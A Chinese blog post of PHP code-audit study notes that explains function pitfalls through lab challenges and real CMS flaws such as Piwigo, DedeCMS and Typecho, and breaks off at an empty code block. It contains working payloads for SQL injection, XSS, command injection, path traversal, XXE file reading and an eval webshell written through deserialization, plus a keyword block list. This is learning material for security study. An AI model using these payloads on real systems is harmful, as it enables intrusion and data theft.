---
title: "Function Defect of Code Audit"
date: 2020-05-14T12:03:22+08:00
draft: flase
tags: [代码审计]
categories: [php]
comment: true
---
 php代码审计学习之函数缺陷
<!--more-->

# php代码审计学习之函数缺陷

**感兴趣的可以参考一下**[PHP-Audit-Labs](https://github.com/hongriSec/PHP-Audit-Labs)

**首发地址：**[php代码审计学习之函数缺陷](https://xz.aliyun.com/t/7765)
## in_array函数缺陷
### Wish List

- Code

```php
class Challenge {
  const UPLOAD_DIRECTORY = './solutions/';
  private $file;
  private $whitelist;

  public function __construct($file) {
    $this->file = $file;
    $this->whitelist = range(1, 24);
  }

  public function __destruct() {
    if (in_array($this->file['name'], $this->whitelist)) {
      move_uploaded_file(
        $this->file['tmp_name'],
        self::UPLOAD_DIRECTORY . $this->file['name']
      );
    }
  }
}

$challenge = new Challenge($_FILES['solution']);
```

- 代码理解

**代码为一个文件上传的代码，如果文件名存在于1-24中，则上传文件**

- in_array函数

```
in_array
检查数组中是否存在某个值
```

- 题解

**php弱类型比较时，6php会转换为6，6在1-24中间，所以可以进行上传**

### piwigo2.7.1实例分析

- 环境搭建

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200308143432.png)

#### 漏洞分析

- 于picture.php:332中

```php
case 'rate' :
    {
      include_once(PHPWG_ROOT_PATH.'include/functions_rate.inc.php');
      rate_picture($page['image_id'], $_POST['rate']);
      redirect($url_self);
    }
```

**当case为rate时，将变量rate和变量image_id传入functions_rate.inc.php文件中的rate_picture函数**

- include/functions_rate.inc.php:38

```php
or !in_array($rate, $conf['rate_items']))
```

**查找变量rate是否存在于$conf['rate_items']当中**

```php
$conf['rate_items']
```
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200308145619.png)

- 直接将rate进行了拼接

```php
$query = '
INSERT
  INTO '.RATE_TABLE.'
  (user_id,anonymous_id,element_id,rate,date)
  VALUES
  ('
    .$user['id'].','
    .'\''.$anonymous_id.'\','
    .$image_id.','
    .$rate
    .',NOW())
;';
  pwg_query($query);

  return update_rating_score($image_id);
}
$query = '
INSERT
  INTO '.RATE_TABLE.'
  (user_id,anonymous_id,element_id,rate,date)
  VALUES
  ('
    .$user['id'].','
    .'\''.$anonymous_id.'\','
    .$image_id.','
    .$rate
    .',NOW())
;';
  pwg_query($query);

  return update_rating_score($image_id);
}
```

**只要rate为array(0,1,2,3,4,5)便可以进行绕过，而in_array第三位未设置为true**

- payload

```php
1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));# 
```

- sqlmap

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200308174418.png)

### CTF 

- 环境搭建

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200308181630.png)

- stop_hack函数

```php
function stop_hack($value){
    $pattern = "insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval";
    $back_list = explode("|",$pattern);
    foreach($back_list as $hack){
        if(preg_match("/$hack/i", $value))
            die("$hack detected!");
    }
    return $value;
}
```

**stop_hack用来过滤一些危险函数**

- 注入

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200308182616.png)

**获取get的ID，通过stop_hack进行过滤并拼接到sql语句中进行查询**

- 报错注入payload

```php
and (select updatexml(1,make_set(3,'~',(select flag from flag)),1))
```
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200308183821.png)

- 参考

```
https://github.com/hongriSec/PHP-Audit-Labs/blob/master/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day1-4/files/README.md
https://xz.aliyun.com/t/2160
```

## filter_var函数缺陷

### Twig

```php
// composer require "twig/twig"
require 'vendor/autoload.php';

class Template {
  private $twig;

  public function __construct() {
    $indexTemplate = '<img ' .
      'src="https://loremflickr.com/320/240">' .
      '<a href="{{link|escape}}">Next slide &raquo;</a>';

    // Default twig setup, simulate loading
    // index.html file from disk
    $loader = new Twig\Loader\ArrayLoader([
      'index.html' => $indexTemplate
    ]);
    $this->twig = new Twig\Environment($loader);
  }

  public function getNexSlideUrl() {
    $nextSlide = $_GET['nextSlide'];
    return filter_var($nextSlide, FILTER_VALIDATE_URL);
  }

  public function render() {
    echo $this->twig->render(
      'index.html',
      ['link' => $this->getNexSlideUrl()]
    );
  }
}

(new Template())->render();
```

**使用escape和filter_var进行过滤**

- escape

**默认是使用了htmlspecialchars方法进行过滤，**

- filter_var

```php
使用特定的过滤器过滤一个变量
mixed filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] )
```

- htmlspecialchars转义

```
& (& 符号)  ===============  &amp;
" (双引号)  ===============  &quot;
' (单引号)  ===============  &apos;
< (小于号)  ===============  &lt;
> (大于号)  ===============  &gt;
```

**默认只过滤双引号，不过滤单引号，只有设置了：quotestyle 选项为ENT_QUOTES才会过滤单引号**

- payload

```
javascript://comment%250aalert(1)
```

### anchor-cms

- 环境搭建

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200309141247.png)

#### 源码分析

- themes/default/404.php:9

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200309150252.png)

- anchor/functions/helpers.php:34 current_url()函数

```php
function current_url() {
	return Uri::current();
}
```

- system/uri.php:84

```php
public static function current() {
		if(is_null(static::$current)) static::$current = static::detect();
		return static::$current;
	}
```

- detect 方法

```php
public static function detect() {
		// create a server object from global
		$server = new Server($_SERVER);

		$try = array('REQUEST_URI', 'PATH_INFO', 'ORIG_PATH_INFO');

		foreach($try as $method) {

			// make sure the server var exists and is not empty
			if($server->has($method) and $uri = $server->get($method)) {

				// apply a string filter and make sure we still have somthing left
				if($uri = filter_var($uri, FILTER_SANITIZE_URL)) {

					// make sure the uri is not malformed and return the pathname
					if($uri = parse_url($uri, PHP_URL_PATH)) {
						return static::format($uri, $server);
					}

					// woah jackie, we found a bad'n
					throw new ErrorException('Malformed URI');
				}
			}
		}

		throw new OverflowException('Uri was not detected. Make sure the REQUEST_URI is set.');
	}
```

**关键代码**

```php
if($uri = filter_var($uri, FILTER_SANITIZE_URL)) {

					// make sure the uri is not malformed and return the pathname
					if($uri = parse_url($uri, PHP_URL_PATH)) {
						return static::format($uri, $server);
					}

					// woah jackie, we found a bad'n
					throw new ErrorException('Malformed URI');
```

- system/uri.php:126

```php
	public static function format($uri, $server) {
		// Remove all characters except letters,
		// digits and $-_.+!*'(),{}|\\^~[]`<>#%";/?:@&=.
		$uri = filter_var(rawurldecode($uri), FILTER_SANITIZE_URL);

		// remove script path/name
		$uri = static::remove_script_name($uri, $server);

		// remove the relative uri
		$uri = static::remove_relative_uri($uri);

		// return argument if not empty or return a single slash
		return trim($uri, '/') ?: '/';
	}
```

**没有对xss进行过滤**

- payload

```
http://localhost:8888/test/index.php/%3Cscript%3Ealert(1)%3C/script%3E
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200309153333.png)

### CTF

- 环境搭建

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200309155130.png)

- flag.php

```php
<?php  
$flag = "HRCTF{f1lt3r_var_1s_s0_c00l}"
?>
```

- index.php

```php
<?php 
$url = $_GET['url']; // 获取url

if(isset($url) && filter_var($url, FILTER_VALIDATE_URL)){  //过滤url
    $site_info = parse_url($url);

    if(preg_match('/sec-redclub.com$/',$site_info['host'])){ //以sec-redclub.com结尾
        exec('curl "'.$site_info['host'].'"', $result);
        echo "<center><h1>You have curl {$site_info['host']} successfully!</h1></center>
              <center><textarea rows='20' cols='90'>";
        echo implode(' ', $result);
    } //命令执行
    
    else{
        die("<center><h1>Error: Host not allowed</h1></center>");
    }

}
else{
    echo "<center><h1>Just curl sec-redclub.com!</h1></center><br>
          <center><h3>For example:?url=http://sec-redclub.com</h3></center>";
}
?>
```

- payload

```
syst1m://"|ls;"sec-redclub.com
syst1m://"|cat<f1agi3hEre.php;"sec-redclub.com
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200309162636.png)


## 实例化任意对象漏洞
### Snow Flake

- code 

```php
function __autoload($className) { //自动加载
  include $className;
}

$controllerName = $_GET['c'];
$data = $_GET['d'];  //获取get的c与d作为类名与参数

if (class_exists($controllerName)) {
  $controller = new $controllerName($data['t'], $data['v']);
  $controller->render();
} else {
  echo 'There is no page with this name';
}

class HomeController {
  private $template;
  private $variables;

  public function __construct($template, $variables) {
    $this->template = $template;
    $this->variables = $variables;
  }

  public function render() {
    if ($this->variables['new']) {
      echo 'controller rendering new response';
    } else {
      echo 'controller rendering old response';
    }
  }
}
```

**如果存在如果程序存在 __autoload函数，class_exists函数就会自动调用方法**

- payload

```
/?c=../../../../etc/passwd
```

###  Shopware 5.3.3 （XXE）

- 环境搭建

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200310141611.png)

#### 代码分析

- 漏洞触发点

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200310142234.png)

- 打断点

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200310143309.png)

- engine/Shopware/Controllers/Backend/ProductStream.php:52

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200310143748.png)

- engine/Shopware/Controllers/Backend/ProductStream.php:63

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200310144659.png)

**使用$this->Request()->getParam('sort')获取sort，然后进入RepositoryInterface类的unserialize方法**

- engine/Shopware/Components/LogawareReflectionHelper.php:56

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200310145112.png)

**调用的是LogawareReflectionHelper类的unserialize方法**

**$serialized为传入的sort变量，遍历取出className，传入createInstanceFromNamedArguments方法**

- engine/Shopware/Components/ReflectionHelper.php:40

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200310145747.png)

**新建一个反射类，并传入参数，类名与参数都为sort中的，而sort可控**

- 发送到burp

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200310153139.png)

- 修改payload

```
/test/backend/ProductStream/loadPreview?_dc=1583825465339&sort={"data":"http://localhost/xxe.xml","options":2,"data_is_url":1,"ns":"","is_prefix":0}}&conditions={}&shopId=1&currencyId=1&customerGroupKey=EK&page=1&start=0&limit=25
```

- 测试

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200310160323.png)

- 参考

```
https://www.php.net/manual/zh/simplexmlelement.construct.php
```

### CTF

- code

```php
<?php

class NotFound{
    function __construct()
    {
        die('404');
    }
}
spl_autoload_register(
    function ($class){
        new NotFound();
    }
);

$classname = isset($_GET['name']) ? $_GET['name'] : null;
$param = isset($_GET['param']) ? $_GET['param'] : null;
$param2 = isset($_GET['param2']) ? $_GET['param2'] : null;
if(class_exists($classname)){
    $newclass = new $classname($param,$param2);
    var_dump($newclass);
    foreach ($newclass as $key=>$value)
        echo $key.'=>'.$value.'<br>';
}
```

**当class_exists时，调用__autoload方法，但是__autoload方法不存在，新建了一个spl_autoload_register方法，类似__autoload方法**

- 列出文件（GlobIterator类）

```php
public GlobIterator::__construct ( string $pattern [, int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO ] )
```

**第一个参数为要搜索的文件名，第二个参数为第二个参数为选择文件的哪个信息作为键名**

- payload

```
http://127.0.0.1:8888/index.php?name=GlobIterator&param=./*.php&param2=0
```
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200310165128.png)

- 读取flag

```
http://127.0.0.1:8888/index.php?name=SimpleXMLElement&param=%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20ANY%20[%3C!ENTITY%20xxe%20SYSTEM%20%22php://filter/read=convert.base64-encode/resource=f1agi3hEre.php%22%3E]%3E%3Cx%3E%26xxe;%3C/x%3E&param2=2
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200310165415.png)
- 参考

```
https://www.php.net/manual/en/function.spl-autoload-register.php
```

## strpos使用不当引发漏洞

### False Beard

- code

```php
class Login {
  public function __construct($user, $pass) {
    $this->loginViaXml($user, $pass);
  }

  public function loginViaXml($user, $pass) {
    if (
      (!strpos($user, '<') || !strpos($user, '>')) &&
      (!strpos($pass, '<') || !strpos($pass, '>'))
    ) {
      $format = '<?xml version="1.0"?>' .
        '<user v="%s"/><pass v="%s"/>';
      $xml = sprintf($format, $user, $pass);
      $xmlElement = new SimpleXMLElement($xml);
      // Perform the actual login.
      $this->login($xmlElement);
    }
  }
}

new Login($_POST['username'], $_POST['password']);
```

- strpos 

```
主要是用来查找字符在字符串中首次出现的位置。
```

**查找代码中是否含有<与>的特殊符号，strpos在没找到指定字符时会返回flase，如果第一个字符找到就返回0，0的取反为1，就可以注入xml进行注入了**

- payload

```php
user=<"><injected-tag property="&pass=<injected-tag>
```

### DeDecms V5.7SP2任意密码重置漏洞

- 环境搭建

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200311133852.png)

- 开启会员登陆并且注册两个会员

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200311140110.png)

- member/resetpassword.php:75 漏洞触发点

```php
else if($dopost == "safequestion")
{
    $mid = preg_replace("#[^0-9]#", "", $id);
    $sql = "SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = '$mid'";
    $row = $db->GetOne($sql);
    if(empty($safequestion)) $safequestion = '';

    if(empty($safeanswer)) $safeanswer = '';

    if($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer)
    {
        sn($mid, $row['userid'], $row['email'], 'N');
        exit();
    }
    else
    {
        ShowMsg("对不起，您的安全问题或答案回答错误","-1");
        exit();
    }

}
```
**将传入的mid进行查询，查询用户查询对应用户的安全问题、安全答案、用户id、电子邮件等信息，然后当安全问题和答案不为空且等于之前的设置的问题和答案的时候，进入sn函数**

- 查看数据表

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200312132918.png)

**当没设置问题答案时，safequestion为0，safeanswer为null，语句变为了**
```php
if($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer)

$row['safequestion'] == 0 
$row['safeanswer'] == null

if ('0' == ''& null == ''){
    sn()
}

 if(false && true)
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200312134303.png)

- member/inc/inc_pwd_functions.php:150

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200312135317.png)

- member/inc/inc_pwd_functions.php:73

**进入newmail函数**

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200312140852.png)

**如果$send == 'N'则发送重置邮件**
```php
sendmail($mailto,$mailtitle,$mailbody,$headers);
```
```php
/resetpassword.php?dopost=getpasswd&amp;id=".$mid."&amp;key=".$randval
```
- member/resetpassword.php:96

**如果$id为空则退出，如果row不为空，则执行**

```php
    if(empty($setp))
    {
        $tptim= (60*60*24*3);
        $dtime = time();
        if($dtime - $tptim > $row['mailtime'])
        {
            $db->executenonequery("DELETE FROM `#@__pwd_tmp` WHERE `md` = '$id';");
            ShowMsg("对不起，临时密码修改期限已过期","login.php");
            exit();
        }
        require_once(dirname(__FILE__)."/templets/resetpassword2.htm");
    }
```
- member/templets/resetpassword2.htm:95

```php
<input type="hidden" name="dopost" value="getpasswd">
<input type="hidden" name="setp" value="2">
<input type="hidden" name="id" value="<?php echo $id;?>" />
```

**将setp的属性设置为2**

- member/resetpassword.php:123

```php
elseif($setp == 2) 
    {
        if(isset($key)) $pwdtmp = $key;

        $sn = md5(trim($pwdtmp));
        if($row['pwd'] == $sn)
        {
            if($pwd != "")
            {
                if($pwd == $pwdok)
                {
                    $pwdok = md5($pwdok);
                    $sql = "DELETE FROM `#@__pwd_tmp` WHERE `mid` = '$id';";
                    $db->executenonequery($sql);
                    $sql = "UPDATE `#@__member` SET `pwd` = '$pwdok' WHERE `mid` = '$id';";
                    if($db->executenonequery($sql))
                    {
                        showmsg('更改密码成功，请牢记新密码', 'login.php');
                        exit;
                    }
                }
            }
            showmsg('对不起，新密码为空或填写不一致', '-1');
            exit;
        }
        showmsg('对不起，临时密码错误', '-1');
        exit;
    }
```

**如果key等于$row['pwd']，则重置密码成功**

#### 漏洞验证

- 访问重置密码链接获取key

```
member/resetpassword.php?dopost=safequestion&safequestion=0.0&safeanswer=&id=3
```
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200312150736.png)

- 重置密码

```
member/resetpassword.php?dopost=getpasswd&id=3&key=VeRkLvEU
```
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200312150922.png)

### CTF

- 环境搭建

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200312160331.png)

- buy.php

```js
<script type="text/javascript" src="js/buy.js"></script>
```

- bug.js

```js
function buy(){
	$('#wait').show();
	$('#result').hide();
	var input = $('#numbers')[0];
	if(input.validity.valid){
		var numbers = input.value;
		$.ajax({
		  method: "POST",
		  url: "api.php",
		  dataType: "json",
		  contentType: "application/json", 
		  data: JSON.stringify({ action: "buy", numbers: numbers })
		}).done(function(resp){
			if(resp.status == 'ok'){
				show_result(resp);
			} else {
				alert(resp.msg);
			}
		})
	} else {
		alert('invalid');
	}
	$('#wait').hide();
}
```
**将用户提交的数字传入到api.php的buy函数**

- api.php

```php
	for($i=0; $i<7; $i++){
		if($numbers[$i] == $win_numbers[$i]){
			$same_count++;
		}
	}
```

**由于是==，可进行弱类型比较，传入7个true**

- payload

```
[true,true,true,true,true,true,true]
```

- 购买flag

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200312171526.png)

## escapeshellarg与escapeshellcmd使用不当
**escapeshellcmd: 除去字串中的特殊符号**
**escapeshellarg 把字符串转码为可以在 shell 命令里使用的参数** 

### postcard
- code

```php
class Mailer {
  private function sanitize($email) {
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
      return '';
    }

    return escapeshellarg($email);
  }

  public function send($data) {
    if (!isset($data['to'])) {
      $data['to'] = 'none@ripstech.com';
    } else {
      $data['to'] = $this->sanitize($data['to']);
    }

    if (!isset($data['from'])) {
      $data['from'] = 'none@ripstech.com';
    } else {
      $data['from'] = $this->sanitize($data['from']);
    }

    if (!isset($data['subject'])) {
      $data['subject'] = 'No Subject';
    }

    if (!isset($data['message'])) {
      $data['message'] = '';
    }

    mail($data['to'], $data['subject'], $data['message'],
      '', "-f" . $data['from']);
  }
}

$mailer = new Mailer();
$mailer->send($_POST);
```

**新建一个MAil类进行邮件发送**

- Php内置函数mail

```php
bool mail (
	string $to , 接收人
	string $subject , 邮件标题
	string $message [, 征文
	string $additional_headers [, 额外头部
	string $additional_parameters ]] 额外参数
)
```
- Linux中的额外参数

```
-O option = value

QueueDirectory = queuedir 选择队列消息

-X logfile

这个参数可以指定一个目录来记录发送邮件时的详细日志情况。

-f from email

这个参数可以让我们指定我们发送邮件的邮箱地址。
```

- 举个例子（原文图）

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200429165336.png)

- 结果

```
17220 <<< To: Alice@example.com
 17220 <<< Subject: Hello Alice!
 17220 <<< X-PHP-Originating-Script: 0:test.php
 17220 <<< CC: somebodyelse@example.com
 17220 <<<
 17220 <<< <?php phpinfo(); ?>
 17220 <<< [EOF]
```

-  filter_var()问题（FILTER_VALIDATE_EMAIL）

> filter_var() 问题在于，我们在双引号中嵌套转义空格仍然能够通过检测。同时由于底层正则表达式的原因，我们通过重叠单引号和双引号，欺骗 filter_val() 使其认为我们仍然在双引号中，这样我们就可以绕过检测。

```
”aaa’aaa”@example.com
```

- escapeshellcmd() 和 escapeshellarg()（会造成特殊字符逃逸）

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200429180904.png)

- 逃逸过程分析

```
$param = "127.0.0.1' -v -d a=1";
$a = escapeshellcmd($param);
$b = escapeshellarg($a);
$cmd = "curl".$b;
var_dump($a)."\n";
var_dump($b)."\n";
var_dump($cmd)."\n";
system($cmd);
```

**传入127.0.0.1' -v -d a=1，escapeshellarg首先进行转义，处理为'127.0.0.1'\'' -v -d a=1'，接着escapeshellcmd处理，处理结果为'127.0.0.1'\\'' -v -d a=1\',\\ 被解释成了 \ 而不再是转义字符**

#### 参考

```
https://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html
```

## 正则使用不当导致的路径穿越问题
### Frost Pattern
- code

```php
class TokenStorage {
  public function performAction($action, $data) {
    switch ($action) {
      case 'create':
        $this->createToken($data);
        break;
      case 'delete':
        $this->clearToken($data);
        break;
      default:
        throw new Exception('Unknown action');
    }
  }

  public function createToken($seed) {
    $token = md5($seed);
    file_put_contents('/tmp/tokens/' . $token, '...data');
  }

  public function clearToken($token) {
    $file = preg_replace("/[^a-z.-_]/", "", $token);
    unlink('/tmp/tokens/' . $file);
  }
}

$storage = new TokenStorage();
$storage->performAction($_GET['action'], $_GET['data']);
```

- preg_replace(函数执行一个正则表达式的搜索和替换)

- payload

```
$action =delete$data = ../../config.php
```

### WeEngine0.8

- web/source/site/category.ctrl.php:176

**file_delete文件删除函数**
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200510093718.png)

- framework/function/file.func.php:294

**查看file_delete函数**

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200510093823.png)

- 追朔$file变量从何而来

```php
if (!empty($navs)) {
		foreach ($navs as $row) {
			file_delete($row['icon']);
		}
```
- 追朔$navs从何而来

```php
	$navs = pdo_fetchall("SELECT icon, id FROM ".tablename('site_nav')." WHERE id IN (SELECT nid FROM ".tablename('site_category')." WHERE id = {$id} OR parentid = '$id')", array(), 'id');
```

- web/source/site/category.ctrl.php:137

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200510095825.png)

- web/source/site/category.ctrl.php:130

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200510095930.png)

**$nav['icon'] 即为文件删除函数的参**

## parse_str函数缺陷

- parse_str

```
parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量。
```
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200510103038.png)

## preg_replace函数之命令执行
### Candle
- code 

```php
header("Content-Type: text/plain");

function complexStrtolower($regex, $value) {
  return preg_replace(
    '/(' . $regex . ')/ei',
    'strtolower("\\1")',
    $value
  );
}

foreach ($_GET as $regex => $value) {
  echo complexStrtolower($regex, $value) . "\n";
}
```

- preg_replace(函数执行一个正则表达式的搜索和替换)

```php
mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
```

**$pattern 存在 /e 模式修正符，允许代码执行**
**/e 模式修正符，是 preg_replace() 将 $replacement 当做php代码来执行**

**将GET请求传过来的参数通过complexStrtolower函数执行，preg_replace函数存在e修正符**

- payload

```php
\S*=${phpinfo()} 
```
#### 参考

[深入研究preg_replace与代码执行](https://xz.aliyun.com/t/2557)

### CmsEasy 5.5

- 环境搭建

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200510160914.png)

#### 漏洞分析

- lib/tool/form.php:90

**如果$form[$name]['default']内容被匹配到就会执行eval**

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200510161952.png)

- cache/template/default/manage/#guestadd.php:175

**全局搜索getform，主要注意catid是作为$name的**

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200510162528.png)

- lib/table/archive.php:25

**追朔catid,寻找到default**

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200510163510.png)

- lib/tool/front_class.php:2367

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200510163724.png)

- lib/tool/front_class.php:493

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200510163809.png)

- lib/tool/front_class.php:332

**$form[$name]['default']可控**
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200510164008.png)

- lib/default/manage_act.php:29

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200510164614.png)

- 测试

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200510165011.png)

## str_replace函数过滤不当

#### Rabbit
- code

```php
class LanguageManager {
  public function loadLanguage() {
    $lang = $this->getBrowserLanguage();
    $sanitizedLang = $this->sanitizeLanguage($lang);
    require_once("/lang/$sanitizedLang");
  }

  private function getBrowserLanguage() {
    $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'en';
    return $lang;
  }

  private function sanitizeLanguage($language) {
    return str_replace('../', '', $language);
  }
}

(new LanguageManager())->loadLanguage();
```

- str_replace(子字符串替换)

```
str_replace(字符串1，字符串2，字符串3)：将字符串3中出现的所有字符串1换成字符串2。

str_replace(数组1，字符串1，字符串2)：将字符串2中出现的所有数组1中的值，换成字符串1。

str_replace(数组1，数组2，字符串1)：将字符串1中出现的所有数组1一一对应，替换成数组2的值，多余的替换成空字符串。
```

- payload

```
....// 或者 ..././ 
```

### Metinfo 6.0.0 

- strstr

```
查找字符串的首次出现到结尾的字符串
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200510181653.png)

#### 漏洞分析

- app/system/include/module/old_thumb.class.php:14

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200510183440.png)

- include/thumb.php:6

**全局搜索**
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200510183630.png)

- app/system/include/class/load.class.php:113

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200510183942.png)

- payload 

```
http://localhost/metInfo/include/thumb.php?dir=.....///http/.....///最终用户授权许可协议.txt
```

## 程序未恰当exit导致的问题

### Anticipation

- code 

```php
extract($_POST);

function goAway() {
  error_log("Hacking attempt.");
  header('Location: /error/');
}

if (!isset($pi) || !is_numeric($pi)) {
  goAway();
}

if (!assert("(int)$pi == 3")) {
  echo "This is not pi.";
} else {
  echo "This might be pi.";
}
```

- extract 

```
从数组中将变量导入到当前的符号表
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200511104100.png)

- payload

```php
pl=phpinfo()
```

- 测试

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200511105009.png)

### FengCms 1.32

- install/index.php

**如果安装完成会生成INSTALL文件，访问文件如果存在此文件则会弹窗提示退出，但没有及时exit，导致程序逻辑还是往下走，还是会安装**

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200511105552.png)

### Simple-Log1.6网站重装漏洞


- install/index.php

**访问文件如果存在此文件则会弹窗提示退出，但没有及时exit，只是跳转到首页，导致程序逻辑还是往下走，还是会安装**

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200511105858.png)

## unserialize反序列化漏洞

### Pumpkin Pie

- code

```php
class Template {
  public $cacheFile = '/tmp/cachefile';
  public $template = '<div>Welcome back %s</div>';

  public function __construct($data = null) {
    $data = $this->loadData($data);
    $this->render($data);
  }

  public function loadData($data) {
    if (substr($data, 0, 2) !== 'O:'
      && !preg_match('/O:\d:\/', $data)) {
      return unserialize($data);
    }
    return [];
  }

  public function createCache($file = null, $tpl = null) {
    $file = $file ?? $this->cacheFile;
    $tpl = $tpl ?? $this->template;
    file_put_contents($file, $tpl);
  }

  public function render($data) {
    echo sprintf(
      $this->template,
      htmlspecialchars($data['name'])
    );
  }

  public function __destruct() {
    $this->createCache();
  }
}

new Template($_COOKIE['data']);
```

- 题解

**在loadData函数中使用到了unserialize反序列化方法，对传进来的$data进行了反序列化，最后对Template进行了实例化，将COOKIE中的data进行了反序列化。**

```php
if (substr($data, 0, 2) !== 'O:'
      && !preg_match('/O:\d:\/', $data))
```
**代码对data进行了判断，不可以为对象，0:X，X不可以为数字，绕过方法可以使用array数组绕过第一个，在X前面加+绕过第二个限制，搭达到到达反序列化方法的步骤。在__destruct销毁时会调用createCache方法写入文件，达成目的。**

- payload

```php
<?php

class Template{
	
	public $cacheFile = './test.php';
	public $template = '<?php eval($_POST[xx])>';
}


$temp= new Template();
$test = Array($temp);
print(serialize($test));

?>
```

- 测试

```
a:1:{i:0;O:+8:"Template":2:{s:9:"cacheFile";s:10:"./test.php";s:8:"template";s:26:"";}}
```
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200512133601.png)

### Typecho-1.1

- 环境搭建

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200512134011.png)

#### 漏洞分析

- install.php:230

**将cookie中的__typecho_configbase64解码之后进行反序列化操作**

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200512134626.png)

- 条件

**如果finish不存在，或者存在config.inc.php文件$_SESSION['typecho']为空，则退出程序**

```php
if (!isset($_GET['finish']) && file_exists(__TYPECHO_ROOT_DIR__ . '/config.inc.php') && empty($_SESSION['typecho'])) {
    exit;}
```

```
finish=1
```

**将反序列化后的结果传递给$config**

- install.php:232

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200512140042.png)

- var/Typecho/Db.php:114

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200512140213.png)

**变量adapterName = 'Typecho_Db_Adapter_' . 变量adapterName，如果adapterName是对象，会触发__toString()方法**

- var/Typecho/Feed.php:223

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200512141504.png)

- var/Typecho/Feed.php:290

**如果$item['author']->screenName为私有属性或者不存在会触发__get方法**
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200512143628.png)

```php
    public function __get($key)
    {
        return $this->get($key);
    }
```

- var/Typecho/Request.php:295

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200512144017.png)


**call_user_fun回调函数，$this->_param['scrrenName'] 的值设置为想要执行的函数，构造 $this->_filter 为对应函数的参数值self::RSS2 == $this->_type,type需要构造，item['author']为触发点，需要构造this_items**

- 构造payload

```php
